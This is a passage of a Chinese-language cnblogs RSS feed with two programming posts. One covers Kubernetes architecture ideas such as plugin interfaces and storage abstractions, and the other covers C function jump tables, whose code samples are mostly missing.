&lt;li&gt;资源较多节点优先&lt;/li&gt;
&lt;li&gt;已使用的节点优先&lt;/li&gt;
&lt;li&gt;已缓存镜像节点优先&lt;/li&gt;
&lt;li&gt;……&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;比如我们在做类似路由系统这种业务系统的时候可以借鉴这种设计模式。简单一词在于每一个小组件简单，它们可以组合起来构成复杂的规则系统，这种设计比把所有逻辑堆在一起简单的多。&lt;/p&gt;
&lt;h2 id=&quot;扩展分层架构&quot;&gt;7、扩展：分层架构&lt;/h2&gt;
&lt;p&gt;K8s的设计理念是类似Linux的分层架构：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;核心层：Kubernetes 最核心的功能，对外提供 API 构建高层的应用，对内提供插件式应用执行环境&lt;/li&gt;
&lt;li&gt;应用层：部署（无状态应用、有状态应用、批处理任务、集群应用等）和路由（服务发现、DNS 解析等）&lt;/li&gt;
&lt;li&gt;管理层：系统度量（如基础设施、容器和网络的度量），自动化（如自动扩展、动态 Provision 等）以及策略管理（RBAC、Quota、PSP、NetworkPolicy 等）&lt;/li&gt;
&lt;li&gt;接口层：kubectl 命令行工具、客户端 SDK 以及集群联邦&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2019/1/24/1687ff6511341555?w=830&amp;amp;h=514&amp;amp;f=png&amp;amp;s=174374&quot;/&gt;&lt;br/&gt;之前介绍的一些组件大多数位于核心层和应用层。在更上层的管理层和接口层，我们往往会做更多的一些二次开发。在之前的文章中我也介绍过，对于复杂的微服务互联网系统，我们也应该把微服务进行分层，从下到上分为基础服务、业务服务、聚合业务服务等，每一层的服务聚合下层实现一些业务逻辑，不但可以做到服务重用，而且上层多变的业务服务的变动可以不影响下层基础设施的搭建。&lt;/p&gt;
&lt;h2 id=&quot;扩展接口化和插件&quot;&gt;8、扩展：接口化和插件&lt;/h2&gt;
&lt;p&gt;除了k8s大量内部组件的实现使用了插件的架构，k8s在整体设计上就把核心和外部的一些资源和服务抽象为了统一的接口，可以插件方式插入具体的实现，如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2019/1/24/1687ff67d920c375?w=830&amp;amp;h=254&amp;amp;f=png&amp;amp;s=81231&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;容器方面，容器运行时插件（Container Runtime Interface，简称 CRI）是 k8s v1.5 引入的容器运行时接口，它将 Kubelet 与容器运行时解耦，将原来完全面向 Pod 级别的内部接口拆分成面向 Sandbox 和 Container 的 gRPC 接口，并将镜像管理和容器管理分离到不同的服务。&lt;/li&gt;
&lt;li&gt;网络方面，k8s支持两种插件：
&lt;ul&gt;&lt;li&gt;kubenet：这是一个基于 CNI bridge 的网络插件（在 bridge 插件的基础上扩展了 port mapping 和 traffic shaping ），是目前推荐的默认插件&lt;/li&gt;
&lt;li&gt;CNI：CNI 网络插件，Container Network Interface (CNI) 最早是由CoreOS发起的容器网络规范，是Kubernetes网络插件的基础。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;存储方面，Container Storage Interface (CSI) 是从 k8s v1.9 引入的容器存储接口，用于扩展 Kubernetes 的存储生态。实际上，CSI 是整个容器生态的标准存储接口，同样适用于 Mesos、Cloud Foundry 等其他的容器集群调度系统&lt;br/&gt;我们看下下面这个图，k8s使用CRI插件来管理容器，为容器配置网络的时候又走了CNI插件：&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2019/1/24/1687ff6ebf58e287?w=830&amp;amp;h=336&amp;amp;f=png&amp;amp;s=99636&quot;/&gt;&lt;br/&gt;CNI、CSI、CRI我们比较熟悉了，其它更多的抽象接口这里就不描述了，k8s就像一个大主板，主板上有各种内存、CPU、IO、网络方面的接口，具体的实现k8s本身并不关心，用户和社区甚至可以根据的需要实现自己的插件。&lt;br/&gt;我觉得这点是最了不起的最困难的，很多时候我们在设计一个系统的时候一开始是无法定义出抽象接口的，因为我们不知道将来会面对什么样的实现，只有到实现越来越多后我们才能抽象出接口才能制定标准。&lt;/p&gt;
&lt;h2 id=&quot;扩展pv-pvc-storageclass&quot;&gt;9、扩展：PV &amp;amp; PVC &amp;amp; StorageClass&lt;/h2&gt;
&lt;p&gt;K8s在存储方面的解耦设计特别值得一提。如下图所示，我们来看一下k8s在存储这块的解耦设计：&lt;br/&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2019/1/24/1687ff709db6f223?w=830&amp;amp;h=444&amp;amp;f=png&amp;amp;s=192070&quot;/&gt;&lt;br/&gt;（图引自Kubernetes in Action一书）&lt;br/&gt;我们要做的事情很明确，Pod需要绑定存储资源：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;首先，我们肯定需要有卷这种抽象，来抽象出存储方式。但是，如果每次都让k8s的使用者（不管是运维还是开发）在部署Pod的时候设置需要的卷显然耦合太强了（比如NFS卷，每次都要设置地址，用于无需也无法关注到底层的这些细节）。卷V描述的是底层存储能力。&lt;/li&gt;
&lt;li&gt;于是，k8s抽象出持久卷PV和和持久卷声明PVC的概念，管理员可以先设置配置PV映射到卷，用户只需要创建PVC来关联PV，然后在创建Pod的时候引用PVC即可，PVC并不关注卷的一些具体细节，只关注容量需求和操作权限。PV这层抽象描述的是运维能提供出来的全局卷的资源，PVC这层描述的是用户希望为Pod申请的存储资源请求。&lt;/li&gt;
&lt;li&gt;但是总是需要运维先创建PV还是不方便，k8s还提供了StorageClass这层抽象，通过把PVC关联到指定的（或默认的）StorageClass来动态创建PV。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;K8s中除了存储抽象的V、PV、PVC、SC，还有其它的一些组件也有类似层次的抽象以及动态绑定的理念。&lt;/p&gt;
&lt;p&gt;我们在使用OO语言进行编程的时候，很自然知道我们需要先定义类，然后再实例化类来创建对象，如果类特别复杂（有不同的实现）的话，我们可能会使用工厂模式（或反射，外层传入目标类型名称）来创建对象。可以和k8s存储抽象比较一下，是不是这个意思，这其实就是一种解耦的方式，在架构设计中，甚至表结构设计中，我们完全可以引入类和实例的概念。比如工作流系统的工作流可以认为是一个类模板，每一次发起的工作流就是这个工作流的实例。&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;好了，本文大概窥探了一下k8s的架构，不知道你是否感受到了k8s的精良设计，对内考虑了高可用以及高可靠，对外考虑到了高可扩展性。几乎任何操作都允许失败，最终实现一致的状态，几乎任何组件都允许扩展和替换，让用户实现自己的定制需求。&lt;/p&gt;
&lt;p&gt;如果你的业务系统也是一套复杂的资源协调系统（k8s抽象的是运维相关的资源，我们的业务系统可以抽象的是其它资源），那么k8s的设计理念有相当多的点可以借鉴。举一个例子，我们在做一套很复杂的流程引擎，我们就可以考虑：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;流程的执行者抽象出接口，插件方式插入系统&lt;/li&gt;
&lt;li&gt;流程涉及到的资源我们可以先梳理清楚列出来&lt;/li&gt;
&lt;li&gt;流程的管理可以把期望结果声明式方式存储到数据库&lt;/li&gt;
&lt;li&gt;流程的管控组件可以都对着统一的API服务读写&amp;amp;订阅变化&lt;/li&gt;
&lt;li&gt;流程的管控组件本身可以采用插件链、职责链方式执行&lt;/li&gt;
&lt;li&gt;流程的入口可以由统一的网关收口做认证和鉴权等&lt;/li&gt;
&lt;li&gt;……&lt;/li&gt;
&lt;/ul&gt;</description>
<pubDate>Thu, 24 Jan 2019 13:21:00 +0000</pubDate>
<dc:creator>lovecindywang</dc:creator>
<og:description>Kubernetes（k8s）是一款开源的优秀的容器编排调度系统，其本身也是一款分布式应用程序。虽然本系列文章讨论的是互联网架构，但是k8s的一些设计理念非常值得深思和借鉴，本人并非运维专家，本文尝试</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/lovecindywang/p/10316898.html</dc:identifier>
</item>
<item>
<title>让你的代码更加优雅的编程技巧-跳转表 - 守望先生</title>
<link>http://www.cnblogs.com/bianchengzhuji/p/10316859.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/bianchengzhuji/p/10316859.html</guid>
<description>&lt;h2 id=&quot;h&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;前面我们讲到了《&lt;a href=&quot;https://www.huyanbing.me/2019/01/03/3593.html&quot;&gt;函数指针&lt;/a&gt;》，今天我们看一个编程技巧-函数跳转表。我们先来看如何实现一个简易计算器。&lt;/p&gt;
&lt;h2 id=&quot;h-1&quot;&gt;初始版本&lt;/h2&gt;
&lt;p&gt;让我们实现一个简易计算器，我们首先能想到的方式是什么？switch语句或者if else语句。没错，初学就会想到的两种方式，我们来看看这种实现方式。这里我们选择switch语句，定义一个操作类型，用户选择操作类型与操作类型匹配时，选择对应的处理函数进行处理，calc1.c代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;c language-c hljs cpp&quot;/&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;除去编译器对switch进行优化的情况&lt;/strong&gt;，这种设计方式有以下几个缺点：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;操作增加时，代码增加，case语句将变得冗长。&lt;/li&gt;
&lt;li&gt;操作增加时，分支增加，处理对应操作的时间将会增长。&lt;/li&gt;
&lt;li&gt;代码可维护性较差。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;我们观察代码会发现，每增加一种操作，就需要增加一个分支，当操作越来越多的时候calc函数将会变得冗长且不易维护。并且如果没有编译器优化，由于在找到最终匹配的之前，每一个case语句都需要执行，因此可能将导致运行时间变长。&lt;/p&gt;
&lt;h2 id=&quot;h-2&quot;&gt;函数跳转表版本&lt;/h2&gt;
&lt;p&gt;既然每一个操作对应一个函数，那么完全可以定义一个函数指针数组，而每个操作对应一个下标值，只要知道下标值，很快就可以找到对应的函数。我们都知道，数组下标方式访问数据效率是很高的。该版本实现如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;c language-c hljs cpp&quot;&gt;calc2.c&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;#&lt;span class=&quot;hljs-meta-keyword&quot;&gt;include&lt;span class=&quot;hljs-meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;#&lt;span class=&quot;hljs-meta-keyword&quot;&gt;include&lt;span class=&quot;hljs-meta-string&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;br/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;calc函数中，直接根据操作类型而选择需要的操作处理函数。时间复杂度为O(1)。另外，当需要新增一种操作时，不需要修改calc函数，只需要在函数表g_opStruct中增加一种操作即可。而操作处理是一个返回值为double，入参为两个double的函数，因此使用：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs cpp&quot;&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;typedef &lt;span class=&quot;hljs-title&quot;&gt;double &lt;span class=&quot;hljs-params&quot;&gt;(*OP_FUNC)&lt;span class=&quot;hljs-params&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;double,&lt;span class=&quot;hljs-keyword&quot;&gt;double);&lt;br/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;将该类型函数指针定义为OP_FUNC，方面后面的使用。&lt;/p&gt;
&lt;p&gt;另外，还可以看到calc函数很简洁，关键代码只有一行。&lt;/p&gt;
&lt;h2 id=&quot;h-3&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;本文的例子有很多可以优化的地方，例如异常时返回0，可能被当成结果等等，这里只是用switch语句和跳转表作简单的示例。而对于同类型的分支处理，完全可以考虑使用跳转表的方式，&lt;strong&gt;使用跳转表还需要注意的一点就是数组越界&lt;/strong&gt;。&lt;br/&gt;跳转表只是一种思路，它并不是在所有情况下都可以替代switch语句，可根据实际情况决定是否需要使用。&lt;/p&gt;
&lt;h2 id=&quot;h-4&quot;&gt;思考&lt;/h2&gt;
&lt;p&gt;为什么在说明第一个版本的简易计算器的时候，强调：除去编译器对switch进行优化的情况？&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;微信公众号【编程珠玑】：专注但不限于分享计算机编程基础，Linux，C语言，C++，算法，数据库等编程相关[原创]技术文章，号内包含大量经典电子书和视频学习资源。欢迎一起交流学习，一起修炼计算机“内功”，知其然，更知其所以然。&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Thu, 24 Jan 2019 13:15:00 +0000</pubDate>
<dc:creator>守望先生</dc:creator>
<og:description>一种让你的代码更加优雅的编程技巧！</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/bianchengzhuji/p/10316859.html</dc:identifier>
</item>
</channel>
</rss>